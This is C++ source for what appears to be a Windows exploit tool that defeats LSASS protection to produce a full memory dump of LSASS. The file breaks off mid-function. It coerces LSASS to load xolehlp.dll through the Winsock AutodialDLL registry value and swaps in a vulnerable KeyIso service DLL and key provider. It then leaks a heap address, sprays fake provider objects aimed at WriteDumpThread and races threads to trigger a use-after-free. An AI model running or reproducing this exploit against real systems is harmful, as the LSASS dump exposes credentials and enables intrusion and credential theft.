#include "exploit.h"
#include <ncrypt.h>
#include <shlwapi.h>
#include <strsafe.h>
#include <minidumpapiset.h>
#include <vector>

BOOL g_bStop = FALSE;
std::vector<HANDLE> g_hRaceThreads;

BOOL Exploit::Main(IN LPEXPLOIT_PARAMETERS Param)
{
    BOOL bResult = FALSE;

    EXPLOIT_INIT_STATE eis = { 0 };
    EXPLOIT_STATE es = { 0 };
    
    LPCSTR szTopDomains[] = TOP_DOMAINS;
    BOOL bXolehlpLoaded;
    HMODULE hXolehlp = NULL;
    ULONG_PTR pXolehlpWriteDumpThread;

    DWORD dwLsassPid;
    PS_PROTECTION ProtectionLevel;

    RPC_BINDING_HANDLE hKeyIsoBinding = NULL;
    PVOID pKeyIsoContext = NULL, pKeyIsoProvider = NULL;
    PVOID ph[PROVIDER_SPRAY_COUNT] = { 0 };
    PVOID sph[PROVIDER_SPRAY_COUNT] = { 0 };

    DWORD dwWait = 0;
    //ULONG_PTR pBeginThreadAddress = 0;
    ULONG_PTR pProviderAddress = 0; // Leaked provider object address
    BOOL bLeakSuccess = FALSE;
    SIMPLE_FAKE_PROVIDER_OBJECT FakeProvider; // Fake provider object
    THREAD_CONTEXT tctx; // Pass required parameters to race threads
    HANDLE hThread;

    DWORD dwTickCountStart, dwOplockAttempts;
    WCHAR wszLsassFilePath[MAX_PATH] = { 0 };
    HANDLE hLsassFileLocked = INVALID_HANDLE_VALUE;
    OVERLAPPED ol = { 0 };
    SYSTEMTIME st = { 0 };
    LPWSTR pwszDumpFilePath = NULL;
    const DWORD dwLsassFileShareMode = FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE;

    Param->ProviderName = STR_KEY_STORAGE_PROVIDER_NAME;

    //
    // Check whether LSASS is protected before running the exploit.
    //

    EXIT_ON_ERROR((dwLsassPid = Process::FindProcessId(MODULE_NAME_W_LSASS)) == 0);
    PRINT_DEBUG(L"Process '%ws' has PID %d", MODULE_NAME_W_LSASS, dwLsassPid);

    EXIT_ON_ERROR(!Process::QueryProtectionLevel(dwLsassPid, &ProtectionLevel));
    if (ProtectionLevel.l.Type != 1)
    {
        PRINT_WARNING(L"Process '%ws' is not a PPL.", MODULE_NAME_W_LSASS);
        if (!Param->Force)
        {
            PRINT_ERROR(L"Aborting... Use option '-f' to ignore this warning.");
            goto cleanup;
        }
    }
    else
    {
        PRINT_INFO(L"Process '%ws' is a PPL.", MODULE_NAME_W_LSASS);
    }

    //
    // Force LSASS to load the DLL xolehlp.dll.
    //

    EXIT_ON_ERROR((hXolehlp = LoadLibraryW(MODULE_NAME_W_XOLEHLP)) == NULL);

    bXolehlpLoaded = FALSE;

    for (int i = 0; i < sizeof(szTopDomains) / sizeof(*szTopDomains); i++)
    {
        if (Process::IsModuleLoaded(dwLsassPid, MODULE_NAME_W_XOLEHLP))
        {
            PRINT_SUCCESS(L"Module '%ws' was loaded in LSASS.", MODULE_NAME_W_XOLEHLP);
            bXolehlpLoaded = TRUE;
            break;
        }

        PRINT_INFO(L"Attempting to coerce LSASS to load module '%ws' (#%d)...", MODULE_NAME_W_XOLEHLP, i + 1);

        EXIT_ON_ERROR(!Exploit::RegisterAutodialDll(MODULE_NAME_W_XOLEHLP, &eis, &es));
        EXIT_ON_ERROR(!Exploit::TriggerHttpRequestFromLsass(szTopDomains[i]));
        EXIT_ON_ERROR(!Exploit::UnregisterAutodialDll(&eis, &es));
    }

    if (!bXolehlpLoaded)
    {
        PRINT_ERROR(L"Failed to coerce LSASS to load module '%ws'.", MODULE_NAME_W_XOLEHLP);
        goto cleanup;
    }

    //
    // Find the address of xolehlp!WriteDumpThread.
    //

    EXIT_ON_ERROR(!FindXolehlpWriteDumpThreadAddress(&pXolehlpWriteDumpThread));
    PRINT_DEBUG(L"Function xolehlp!WriteDumpThread @ 0x%llx", pXolehlpWriteDumpThread);

    //
    // Update / create appropriate values in the MSDTC registry key.
    //

    EXIT_ON_ERROR(!Exploit::RegisterMinidumpParameters(Param->OutputDirectoryPath, MiniDumpWithFullMemory, &eis, &es));
    PRINT_DEBUG(L"MSDTC MiniDump parameters registered.");

    //
    // Test xolehlp!WriteDumpThread on current process before messing with LSASS.
    //

    EXIT_ON_ERROR(!Exploit::TestXolehlpWriteDumpThread(pXolehlpWriteDumpThread, Param->OutputDirectoryPath));
    PRINT_DEBUG(L"Test of xolehlp!WriteDumpThread was successful.");

    //
    // Load the vulnerable keyiso.dll and ncryptprov.dll DLLs into LSASS.
    //

    EXIT_ON_ERROR(!Exploit::PrepareKeyIsoService(Param, &eis, &es));
    EXIT_ON_ERROR(!Exploit::RegisterVulnerableKeyStorageProvider(Param, &es));

    //
    // Set up the KeyIso RPC connection and context.
    //

    PRINT_DEBUG(L"Connecting to RPC server...");
    EXIT_ON_ERROR((hKeyIsoBinding = KeyIso::CreateBindingHandle()) == NULL);
    PRINT_DEBUG(L"Binding handle: 0x%016llx", (LONG_PTR)hKeyIsoBinding);

    EXIT_ON_ERROR(KeyIso::CreateContext(hKeyIsoBinding, &pKeyIsoContext) != RPC_S_OK);
    PRINT_DEBUG(L"Context handle: 0x%016llx", (LONG_PTR)pKeyIsoContext);

    EXIT_ON_ERROR(KeyIso::CryptOpenStorageProvider(hKeyIsoBinding, pKeyIsoContext, &pKeyIsoProvider, Param->ProviderName) != RPC_S_OK);
    PRINT_DEBUG(L"Provider handle: 0x%08x", HandleToULong(pKeyIsoProvider));

    //
    // Try to leak the address of a Provider object in LSASS heap.
    //

    for (int i = 0; i < PROVIDER_SPRAY_COUNT; i++)
        EXIT_ON_ERROR(KeyIso::CryptOpenStorageProvider(hKeyIsoBinding, pKeyIsoContext, &ph[i], Param->ProviderName) != RPC_S_OK);
    PRINT_DEBUG(L"Sprayed %d Provider objects", PROVIDER_SPRAY_COUNT);

    for (int i = 0; i < MAX_MEMORY_LEAK_ATTEMPTS; i++)
    {
        PRINT_INFO(L"Attempting to leak a provider object address (#%d)...", i + 1);
        if (Exploit::LeakProviderAddress(hKeyIsoBinding, pKeyIsoContext, ph[0x82], &pProviderAddress))
        {
            bLeakSuccess = TRUE;
            PRINT_SUCCESS(L"Leaked provider object address: 0x%llx", pProviderAddress);
            break;
        }

        Sleep(1000);
    }

    if (!bLeakSuccess)
    {
        PRINT_ERROR(L"Failed to obtain a valid provider object address.");
        goto cleanup;
    }

    //
    // Craft a fake Provider object, and spray it. Ideally, we want to
    // start WriteDumpThread in a new thread, but it doesn't work,
    // LSASS would still be stuck because of our file oplock.
    //

    ZeroMemory(&FakeProvider, sizeof(FakeProvider));
    FakeProvider.RefCount = 1;
    FakeProvider.VtableEntry = (PVOID)pXolehlpWriteDumpThread;
    FakeProvider.Argument1 = NULL;

    for (int i = 0; i < PROVIDER_SPRAY_COUNT; i += 2)
    {
        EXIT_ON_ERROR(KeyIso::CryptFreeProvider(hKeyIsoBinding, pKeyIsoContext, ph[i]) != RPC_S_OK);
        ph[i] = NULL;
    }

    PRINT_DEBUG(L"Freed %d Provider objects", PROVIDER_SPRAY_COUNT / 2);

    for (int i = 1; i < PROVIDER_SPRAY_COUNT; i += 2)
        KeyIso::CryptSetProviderProperty(hKeyIsoBinding, pKeyIsoContext, ph[i], NCRYPT_USE_CONTEXT_PROPERTY, &FakeProvider, sizeof(FakeProvider));
    for (int i = 0; i < PROVIDER_SPRAY_COUNT; i++)
        KeyIso::CryptSetProviderProperty(hKeyIsoBinding, pKeyIsoContext, sph[i], NCRYPT_USE_CONTEXT_PROPERTY, &FakeProvider, sizeof(FakeProvider));

    PRINT_DEBUG(L"Sprayed %d fake Provider objects", PROVIDER_SPRAY_COUNT / 2 + PROVIDER_SPRAY_COUNT);

    //
    // Lock the file lsass.exe to detect when MiniDumpWriteDump is
    // executed by LSASS.
    //

    EXIT_ON_ERROR(!GetSystemDirectoryW(wszLsassFilePath, MAX_PATH));
    StringCchPrintfW(wszLsassFilePath, MAX_PATH, L"%ws\\%ws", wszLsassFilePath, MODULE_NAME_W_LSASS);

    hLsassFileLocked = Filesystem::SetFileOpLock(wszLsassFilePath, dwLsassFileShareMode, TRUE, &ol);
    EXIT_ON_ERROR(hLsassFileLocked == INVALID_HANDLE_VALUE);
    EXIT_ON_ERROR(!ol.hEvent);
    PRINT_INFO(L"Oplock set on '%ws'.", wszLsassFilePath);

    GetLocalTime(&st);

    //
    // Race to trigger UAF.
    //

    ZeroMemory(&tctx, sizeof(tctx));
    tctx.hBinding = hKeyIsoBinding;
    tctx.contextHandle = pKeyIsoContext;
    tctx.fakeProviderAddress = pProviderAddress;

    for (int i = 0; i < RACE_THREAD_COUNT * 2; i++)
    {
        EXIT_ON_ERROR((hThread = CreateThread(NULL, 0, Exploit::RaceSprayFakeKey, &tctx, 0, NULL)) == NULL);
        g_hRaceThreads.push_back(hThread);
    }

    CreateRaceThreads(hKeyIsoBinding);

    PRINT_INFO(L"Attempting race for %d seconds...", RACE_TIMEOUT / 1000);

#pragma warning( push )
#pragma warning( disable : 28159 )
    // GetTickCount is sufficient for our needs, we don't need GetTickCount64.
    dwTickCountStart = GetTickCount();

    do
    {
        dwWait = WaitForSingleObject(ol.hEvent, RACE_TIMEOUT - (GetTickCount() - dwTickCountStart));

        if (dwWait == WAIT_OBJECT_0)
        {
            if (Exploit::FindXolehlpDumpFilePath(Param->OutputDirectoryPath, &st, MODULE_NAME_W_LSASS, &pwszDumpFilePath))
            {
                PRINT_SUCCESS(L"Found dump file after %d seconds: %ws", (GetTickCount() - dwTickCountStart) / 1000, pwszDumpFilePath);
                break;
            }
            else
            {
                PRINT_INFO(L"Oplock triggered, but no dump file found, keep monitoring (time remaining: %d seconds).", (RACE_TIMEOUT - (GetTickCount() - dwTickCountStart)) / 1000);

                CloseHandle(ol.hEvent);
                ol.hEvent = NULL;
                CloseHandle(hLsassFileLocked);
                dwOplockAttempts = 0;

                do
                {
                    if ((hLsassFileLocked = Filesystem::SetFileOpLock(wszLsassFilePath, dwLsassFileShareMode, TRUE, &ol)) != INVALID_HANDLE_VALUE)
                    {
                        PRINT_INFO(L"Oplock set on '%ws'.", wszLsassFilePath);
                        break;
                    }
                    else
                    {
                        Sleep(500); // Pause before retrying to set the oplock.
                    }

                    dwOplockAttempts++;
                } while (dwOplockAttempts < MAX_OPLOCK_ATTEMPTS);
            }
        }
    } while (GetTickCount() - dwTickCountStart < RACE_TIMEOUT);
#pragma warning( pop )

    g_bStop = TRUE;

    PRINT_INFO(L"End of attempt, waiting for the all threads to complete...");
    dwWait = Exploit::WaitForRaceThreads(10000);
    if (dwWait == WAIT_TIMEOUT)
    {
        PRINT_INFO(L"Some threads are probably stuck because of our lock.");
    }
    else if (dwWait != WAIT_FAILED)
    {
        PRINT_INFO(L"All threads completed.");
    }

    if (!pwszDumpFilePath)
    {
        PRINT_WARNING(L"Dump file not found, exploit most likely failed.");
        goto cleanup;
    }

    bResult = TRUE;

cleanup:
    // Release oplock (if opened), and wait for our threads to complete if necessary.
    if (hLsassFileLocked && hLsassFileLocked != INVALID_HANDLE_VALUE) CloseHandle(hLsassFileLocked); // Release oplock
    if (dwWait == WAIT_TIMEOUT) Exploit::WaitForRaceThreads(INFINITE);

    if (ol.hEvent) CloseHandle(ol.hEvent);
    if (pwszDumpFilePath) HeapFree(GetProcessHeap(), 0, pwszDumpFilePath);
    if (pKeyIsoProvider) KeyIso::CryptFreeProvider(hKeyIsoBinding, pKeyIsoContext, pKeyIsoProvider);
    if (pKeyIsoContext) KeyIso::ReleaseContext(hKeyIsoBinding, &pKeyIsoContext);
    if (hKeyIsoBinding) KeyIso::CloseBindingHandle(hKeyIsoBinding);

    Exploit::CloseRaceThreadHandles();
    Exploit::UnregisterVulnerableKeyStorageProvider(Param, &es);
    Exploit::RestoreKeyIsoService(Param, &eis, &es);
    Exploit::DeleteVulnerableKeyStorageProviderDll(Param, &es);
    Exploit::UnregisterMinidumpParameters(&eis, &es);
    Exploit::UnregisterAutodialDll(&eis, &es);

    if (hXolehlp) FreeLibrary(hXolehlp);

    if (eis.KeyIsoServiceDllPath) HeapFree(GetProcessHeap(), 0, eis.KeyIsoServiceDllPath);
    if (eis.WinsockAutodialDllPath) HeapFree(GetProcessHeap(), 0, eis.WinsockAutodialDllPath);
    if (eis.MsdtcDumpLocation) HeapFree(GetProcessHeap(), 0, eis.MsdtcDumpLocation);

    return bResult;
}

BOOL Exploit::PrepareKeyIsoService(IN LPEXPLOIT_PARAMETERS ExploitParams, IN OUT LPEXPLOIT_INIT_STATE ExploitInitState, IN OUT LPEXPLOIT_STATE ExploitState)
{
    BOOL bResult = FALSE;
    DWORD dwDataSize;
    WCHAR wszDllPath[MAX_PATH + 1];

    PRINT_DEBUG(L"Adding catalog file '%ws' to database...", ExploitParams->CatalogPath);
    EXIT_ON_ERROR(!Util::AddCatalogFile(ExploitParams->CatalogPath));
    ExploitState->CatalogFileAdded = TRUE;
    PRINT_SUCCESS(L"Added catalog file '%ws' to database.", ExploitParams->CatalogPath);

    EXIT_ON_ERROR(!Service::QueryState(SERVICE_NAME_W_KEYISO, &ExploitState->KeyIsoServiceState));
    ExploitInitState->KeyIsoServiceState = ExploitState->KeyIsoServiceState;

    if (ExploitState->KeyIsoServiceState == SERVICE_RUNNING)
    {
        PRINT_DEBUG(L"Stopping service '%ws'...", SERVICE_NAME_W_KEYISO);
        EXIT_ON_ERROR(!Service::Stop(SERVICE_NAME_W_KEYISO, TRUE));
        //PRINT_SUCCESS(L"Stopped service '%ws'.", KEYISO_NAME);
        EXIT_ON_ERROR(!Service::QueryState(SERVICE_NAME_W_KEYISO, &ExploitState->KeyIsoServiceState));
    }

    EXIT_ON_ERROR(!GetFullPathNameW(ExploitParams->KeyIsoDllPath, MAX_PATH, wszDllPath, NULL));

    EXIT_ON_ERROR(!Registry::QueryValue(HKEY_LOCAL_MACHINE, REG_PATH_W_KEYISO_PARAMETERS, REG_VALUE_NAME_W_KEYISO_SERVICEDLL, NULL, (LPBYTE*)&ExploitInitState->KeyIsoServiceDllPath, &dwDataSize));
    PRINT_DEBUG(L"Service DLL path: %ws", ExploitInitState->KeyIsoServiceDllPath);

    dwDataSize = (DWORD)((wcslen(wszDllPath) + 1) * sizeof(*wszDllPath));
    EXIT_ON_ERROR(!Registry::SetValue(HKEY_LOCAL_MACHINE, REG_PATH_W_KEYISO_PARAMETERS, REG_VALUE_NAME_W_KEYISO_SERVICEDLL, REG_EXPAND_SZ, (LPBYTE)wszDllPath, dwDataSize));
    ExploitState->KeyIsoServiceDllPathSet = TRUE;
    //PRINT_SUCCESS(L"Set service DLL path '%ws'.", wszDllPath);

    PRINT_DEBUG(L"Starting service '%ws'...", SERVICE_NAME_W_KEYISO);
    EXIT_ON_ERROR(!Service::Start(SERVICE_NAME_W_KEYISO, TRUE));
    EXIT_ON_ERROR(!Service::QueryState(SERVICE_NAME_W_KEYISO, &ExploitState->KeyIsoServiceState));
    EXIT_ON_ERROR(ExploitState->KeyIsoServiceState != SERVICE_RUNNING);
    //PRINT_SUCCESS("Started service '%ws'.", KEYISO_NAME);

    PRINT_SUCCESS(L"Started service '%ws' using DLL '%ws'.", SERVICE_NAME_W_KEYISO, wszDllPath);

    bResult = TRUE;

cleanup:

    return bResult;
}

VOID Exploit::RestoreKeyIsoService(IN LPEXPLOIT_PARAMETERS ExploitParams, IN LPEXPLOIT_INIT_STATE ExploitInitState, IN OUT LPEXPLOIT_STATE ExploitState)
{
    DWORD dwDataSize;

    // Stop service and restore DLL path.
    if (ExploitState->KeyIsoServiceDllPathSet)
    {
        if (ExploitState->KeyIsoServiceState == SERVICE_RUNNING)
        {
            PRINT_DEBUG(L"Stopping service '%ws'...", SERVICE_NAME_W_KEYISO);
            if (!Service::Stop(SERVICE_NAME_W_KEYISO, TRUE))
                PRINT_ERROR(L"Failed to stop service '%ws'.", SERVICE_NAME_W_KEYISO);
            Service::QueryState(SERVICE_NAME_W_KEYISO, &ExploitState->KeyIsoServiceState);
        }

        PRINT_DEBUG(L"Restoring service DLL path '%ws'...", ExploitInitState->KeyIsoServiceDllPath);
        dwDataSize = (DWORD)((wcslen(ExploitInitState->KeyIsoServiceDllPath) + 1) * (DWORD)sizeof(*ExploitInitState->KeyIsoServiceDllPath));
        if (Registry::SetValue(HKEY_LOCAL_MACHINE, REG_PATH_W_KEYISO_PARAMETERS, REG_VALUE_NAME_W_KEYISO_SERVICEDLL, REG_EXPAND_SZ, (LPBYTE)ExploitInitState->KeyIsoServiceDllPath, dwDataSize))
        {
            PRINT_INFO(L"Restored service DLL path '%ws' in registry.", ExploitInitState->KeyIsoServiceDllPath);
        }
        else
        {
            PRINT_ERROR(L"Failed to restore service DLL path '%ws' in registry.", ExploitInitState->KeyIsoServiceDllPath);
        }
    }

    // Restore initial service state.
    if (ExploitState->KeyIsoServiceState == SERVICE_STOPPED && ExploitInitState->KeyIsoServiceState == SERVICE_RUNNING)
    {
        PRINT_DEBUG(L"Starting service '%ws'...", SERVICE_NAME_W_KEYISO);
        if (!Service::Start(SERVICE_NAME_W_KEYISO, TRUE))
            PRINT_ERROR(L"Failed to start service '%ws'.", SERVICE_NAME_W_KEYISO);
    }

    // Remove our catalog file
    if (ExploitState->CatalogFileAdded)
    {
        PRINT_DEBUG(L"Removing catalog file '%ws' from database...", ExploitParams->CatalogPath);
        if (Util::RemoveCatalogFile(ExploitParams->CatalogPath))
        {
            PRINT_INFO(L"Removed catalog file '%ws' from database.", ExploitParams->CatalogPath);
        }
        else
        {
            PRINT_ERROR(L"Failed to remove catalog file '%ws' from database.", ExploitParams->CatalogPath);
        }
    }
}

BOOL Exploit::RegisterVulnerableKeyStorageProvider(IN LPEXPLOIT_PARAMETERS ExploitParams, IN OUT LPEXPLOIT_STATE ExploitState)
{
    BOOL bResult = FALSE;
    WCHAR wszDllPath[MAX_PATH + 1];
    LPWSTR pwszFilename = NULL;

    // The Key Storage Provider DLL must be located in the system folder.
    EXIT_ON_ERROR(!GetSystemDirectoryW(wszDllPath, MAX_PATH));
    if (PathIsRelativeW(ExploitParams->ProviderDllPath))
    {
        StringCchPrintfW(wszDllPath, MAX_PATH, L"%ws\\%ws", wszDllPath, ExploitParams->ProviderDllPath);
    }
    else
    {
        EXIT_ON_ERROR((pwszFilename = PathFindFileNameW(ExploitParams->ProviderDllPath)) == ExploitParams->ProviderDllPath);
        StringCchPrintfW(wszDllPath, MAX_PATH, L"%ws\\%ws", wszDllPath, pwszFilename);
    }

    PRINT_DEBUG(L"Copying provider DLL '%ws' to: %ws", ExploitParams->ProviderDllPath, wszDllPath);
    if (!CopyFileW(ExploitParams->ProviderDllPath, wszDllPath, TRUE))
    {
        PRINT_ERROR(L"Failed to copy provider DLL to '%ws'.", wszDllPath);
        Util::PrintLastError(GetLastError());
        goto cleanup;
    }
    ExploitState->KeyStorageProviderDllCopied = TRUE;
    PRINT_SUCCESS(L"Copied provider DLL to '%ws'.", wszDllPath);

    PRINT_DEBUG(L"Registering provider '%ws'...", ExploitParams->ProviderName);
    EXIT_ON_ERROR(!KeyStorageProvider::Register(ExploitParams->ProviderName, wszDllPath));
    ExploitState->KeyStorageProviderRegistered = TRUE;
    PRINT_SUCCESS(L"Registered provider '%ws' using DLL '%ws'.", ExploitParams->ProviderName, PathFindFileNameW(wszDllPath));

    bResult = TRUE;

cleanup:
    if (!bResult)
    {
        PRINT_ERROR(L"Failed to register provider '%ws'.", ExploitParams->ProviderName);
    }

    return ExploitState->KeyStorageProviderRegistered;
}

VOID Exploit::UnregisterVulnerableKeyStorageProvider(IN LPEXPLOIT_PARAMETERS ExploitParams, IN OUT LPEXPLOIT_STATE ExploitState)
{
    if (ExploitState->KeyStorageProviderRegistered)
    {
        PRINT_DEBUG(L"Removing provider '%ws'...", ExploitParams->ProviderName);
        ExploitState->KeyStorageProviderRegistered = !KeyStorageProvider::Unregister(ExploitParams->ProviderName);
        if (!ExploitState->KeyStorageProviderRegistered)
        {
            PRINT_INFO(L"Removed provider '%ws'.", ExploitParams->ProviderName);
        }
        else
        {
            PRINT_ERROR(L"Failed to remove provider '%ws'.", ExploitParams->ProviderName);
        }
    }
}

VOID Exploit::DeleteVulnerableKeyStorageProviderDll(IN LPEXPLOIT_PARAMETERS ExploitParams, IN OUT LPEXPLOIT_STATE ExploitState)
{
    WCHAR wszDllPath[MAX_PATH + 1];
    LPWSTR pwszFilename = NULL;

    if (ExploitState->KeyStorageProviderDllCopied)
    {
        GetSystemDirectoryW(wszDllPath, MAX_PATH);
        pwszFilename = PathFindFileNameW(ExploitParams->ProviderDllPath);
        StringCchPrintfW(wszDllPath, MAX_PATH, L"%ws\\%ws", wszDllPath, pwszFilename);
        PRINT_DEBUG(L"Attempting to delete provider DLL '%ws'...", wszDllPath);

        if (DeleteFileW(wszDllPath))
        {
            ExploitState->KeyStorageProviderDllCopied = FALSE;
            PRINT_INFO("Deleted provider DLL '%ws'.", wszDllPath);
        }
        else
        {
            PRINT_ERROR(L"Failed to delete provider DLL '%ws'.", wszDllPath);
        }
    }
}

BOOL Exploit::LeakProviderAddress(IN RPC_BINDING_HANDLE BindingHandle, IN PVOID ContextHandle, IN PVOID ProviderHandle, OUT PULONG_PTR LeakedAddress)
{
    BOOL bResult = FALSE;

    DWORD i;
    ULONG_PTR addrs[MEMBUF_SPRAY_COUNT] = { 0 }, uLeakedAddr;
    BYTE bufferIn[0x30];
    BYTE bufferOut[0x40];
    LONG lWritten = 0;

    RtlZeroMemory(addrs, sizeof(addrs));
    RtlFillMemory(bufferIn, 0x30, 'A');
    RtlZeroMemory(bufferOut, sizeof(bufferOut));

    for (i = 0; i < MEMBUF_SPRAY_COUNT; i++)
    {
        EXIT_ON_ERROR(KeyIso::CryptEnumKeys(BindingHandle, ContextHandle, ProviderHandle, &addrs[i]) != RPC_S_OK);
    }
    PRINT_DEBUG(L"Sprayed %d memory buffers", MEMBUF_SPRAY_COUNT);

    for (i = 0; i < MEMBUF_SPRAY_COUNT; i += 2)
    {
        EXIT_ON_ERROR(KeyIso::CryptFreeBuffer(BindingHandle, ContextHandle, addrs[i]) != RPC_S_OK);
        addrs[i] = 0;
    }
    PRINT_DEBUG(L"Freed %d memory buffers", MEMBUF_SPRAY_COUNT / 2);

    EXIT_ON_ERROR(KeyIso::CryptSetProviderProperty(BindingHandle, ContextHandle, ProviderHandle, NCRYPT_USE_CONTEXT_PROPERTY, bufferIn, sizeof(bufferIn)) != RPC_S_OK);
    PRINT_DEBUG(L"Set property '%ws' (written=%d)", NCRYPT_USE_CONTEXT_PROPERTY, (DWORD)sizeof(bufferIn));

    EXIT_ON_ERROR(KeyIso::CryptGetProviderProperty(BindingHandle, ContextHandle, ProviderHandle, NCRYPT_USE_CONTEXT_PROPERTY, bufferOut, sizeof(bufferOut), &lWritten) != RPC_S_OK);
    PRINT_DEBUG(L"Get property '%ws' (written=%d)", NCRYPT_USE_CONTEXT_PROPERTY, lWritten);

    PRINT_BUFFER(bufferOut, sizeof(bufferOut));

    uLeakedAddr = *(PULONG_PTR)(bufferOut + 0x30);

    if (uLeakedAddr < 0xffffffff)
    {
        PRINT_WARNING(L"Leaked address is invalid: 0x%llx", uLeakedAddr);
        goto cleanup;
    }

    *LeakedAddress = uLeakedAddr;
    bResult = TRUE;

cleanup:
    for (i = 0; i < MEMBUF_SPRAY_COUNT; i++)
        if (addrs[i])
            KeyIso::CryptFreeBuffer(BindingHandle, ContextHandle, addrs[i]);

    return bResult;
}

DWORD WINAPI Exploit::RaceSprayFakeKey(LPVOID Param)
{
    PVOID ph = NULL;
    SIMPLE_FAKE_KEY_OBJECT fko;
    PTHREAD_CONTEXT pCtx = (PTHREAD_CONTEXT)Param;

    ZeroMemory(&fko, sizeof(fko));
    fko.refcount = 1;
    fko.provider = (PSIMPLE_FAKE_PROVIDER_OBJECT)pCtx->fakeProviderAddress;

    while (!g_bStop)
    {
        KeyIso::CryptOpenStorageProvider(pCtx->hBinding, pCtx->contextHandle, &ph, STR_KEY_STORAGE_PROVIDER_NAME);
        KeyIso::CryptSetProviderProperty(pCtx->hBinding, pCtx->contextHandle, ph, NCRYPT_USE_CONTEXT_PROPERTY, &fko, sizeof(fko));
    }

    return 0;
}

DWORD WINAPI Exploit::RaceCreatePersistedKey(LPVOID Param)
{
    PTHREAD_CONTEXT pCtx = (PTHREAD_CONTEXT)Param;

    while (!g_bStop)
        KeyIso::CryptCreatePersistedKey(pCtx->hBinding, pCtx->contextHandle, pCtx->providerHandle, (PVOID*)&pCtx->keyHandle, BCRYPT_3DES_ALGORITHM, NULL, 0);

    return 0;
}

DWORD WINAPI Exploit::RaceFreePersistedKey(LPVOID Param)
{
    PTHREAD_CONTEXT pCtx = (PTHREAD_CONTEXT)Param;

    while (!g_bStop)
        KeyIso::CryptFreeKey(pCtx->hBinding, pCtx->contextHandle, pCtx->providerHandle, (PVOID)((ULONG_PTR)pCtx->keyHandle + 1));

    return 0;
}

VOID Exploit::CreateRaceThreads(IN RPC_BINDING_HANDLE BindingHandle)
{
    THREAD_CONTEXT ctx;
    HANDLE hThread;

    ZeroMemory(&ctx, sizeof(ctx));
    ctx.hBinding = BindingHandle;

    KeyIso::CreateContext(ctx.hBinding, &ctx.contextHandle);
    KeyIso::CryptOpenStorageProvider(ctx.hBinding, ctx.contextHandle, &ctx.providerHandle, STR_KEY_STORAGE_PROVIDER_NAME);

    EXIT_ON_ERROR((hThread = CreateThread(NULL, 0, Exploit::RaceCreatePersistedKey, &ctx, 0, NULL)) == NULL);
    g_hRaceThreads.push_back(hThread);

    for (int i = 0; i < RACE_THREAD_COUNT; i++)
    {
        EXIT_ON_ERROR((hThread = CreateThread(NULL, 0, Exploit::RaceFreePersistedKey, &ctx, 0, NULL)) == NULL);
        g_hRaceThreads.push_back(hThread);
    }

cleanup:
    return;
}

DWORD Exploit::WaitForRaceThreads(IN DWORD Milliseconds)
{
    DWORD dwWait = WAIT_FAILED;
    DWORD dwArraySize;
    PHANDLE phThreadHandles = NULL;

    dwArraySize = (DWORD)g_hRaceThreads.size();

    EXIT_ON_ERROR((phThreadHandles = (PHANDLE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwArraySize * sizeof(HANDLE))) == NULL);

    for (DWORD i = 0; i < dwArraySize; i++)
    {
        phThreadHandles[i] = g_hRaceThreads.at(i);
    }

    dwWait = WaitForMultipleObjects(dwArraySize, phThreadHandles, TRUE, Milliseconds);
    if (dwWait == WAIT_FAILED) Util::PrintLastError(GetLastError());

cleanup:
    if (phThreadHandles) HeapFree(GetProcessHeap(), 0, phThreadHandles);

    return dwWait;
}

VOID Exploit::CloseRaceThreadHandles()
{
    for (HANDLE &hThread : g_hRaceThreads)
        if (hThread) CloseHandle(hThread);

    g_hRaceThreads.clear();
}

BOOL Exploit::RegisterAutodialDll(IN LPCWSTR ModuleName, IN OUT LPEXPLOIT_INIT_STATE ExploitInitState, IN OUT LPEXPLOIT_STATE ExploitState)
{
    BOOL bResult = FALSE;
    DWORD dwDataSize;

    if (!ExploitState->WinsockAutodialDllRegistered)
    {
        EXIT_ON_ERROR(!Registry::QueryValue(
            HKEY_LOCAL_MACHINE,
            REG_PATH_W_WINSOCK2_PARAMETERS,
            REG_VALUE_NAME_W_AUTODIALDLL,
            NULL,
            (LPBYTE*)&ExploitInitState->WinsockAutodialDllPath,
            &dwDataSize
        ));

        //PRINT_DEBUG(L"Winsock2 AutodialDll path: %ws", ExploitInitState->WinsockAutodialDllPath);
    }

    dwDataSize = (DWORD)((wcslen(ModuleName) + 1) * sizeof(*ModuleName));

    EXIT_ON_ERROR(!Registry::SetValue(
        HKEY_LOCAL_MACHINE,
        REG_PATH_W_WINSOCK2_PARAMETERS,
        REG_VALUE_NAME_W_AUTODIALDLL,
        REG_SZ,
        (LPBYTE)ModuleName,
        dwDataSize
    ));

    ExploitState->WinsockAutodialDllRegistered = TRUE;

    bResult = TRUE;

cleanup:
    if (!bResult) PRINT_ERROR(L"Failed to register Winsock2 AutodialDLL path.");

    return bResult;
}

BOOL Exploit::UnregisterAutodialDll(IN LPEXPLOIT_INIT_STATE ExploitInitState, IN OUT LPEXPLOIT_STATE ExploitState)
{
    BOOL bResult = FALSE;
    DWORD dwDataSize;

    if (ExploitState->WinsockAutodialDllRegistered)
    {
        if (!ExploitInitState->WinsockAutodialDllPath)
        {
            PRINT_ERROR(L"Saved Winsock2 AutodialDLL path is empty.");
            goto cleanup;
        }

        dwDataSize = (DWORD)((wcslen(ExploitInitState->WinsockAutodialDllPath) + 1) * sizeof(*ExploitInitState->WinsockAutodialDllPath));

        EXIT_ON_ERROR(!Registry::SetValue(
            HKEY_LOCAL_MACHINE,
            REG_PATH_W_WINSOCK2_PARAMETERS,
            REG_VALUE_NAME_W_AUTODIALDLL,
            REG_SZ,
            (LPBYTE)ExploitInitState->WinsockAutodialDllPath,
            dwDataSize
        ));

        ExploitState->WinsockAutodialDllRegistered = FALSE;
    }

    bResult = TRUE;

cleanup:
    if (!bResult) PRINT_ERROR(L"Failed to restore Winsock2 AutodialDLL path.");

    return bResult;
}

BOOL Exploit::TriggerHttpRequestFromLsass(IN LPCSTR DomainName)
{
    BOOL bResult = FALSE;
    TlsClient::PTLS_SOCKET socket = NULL;

    EXIT_ON_ERROR((socket = (TlsClient::PTLS_SOCKET)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(*socket))) == NULL);
    EXIT_ON_ERROR(TlsClient::Connect(socket, DomainName, 443) != 0);
    TlsClient::Disconnect(socket);
    bResult = TRUE;
cleanup:
    if (socket) HeapFree(GetProcessHeap(), 0, socket);

    return bResult;
}

BOOL Exploit::FindXolehlpWriteDumpThreadAddress(OUT PULONG_PTR WriteDumpThreadAddress)
{
    BOOL bResult = FALSE, bXolehelpLoaded = FALSE;
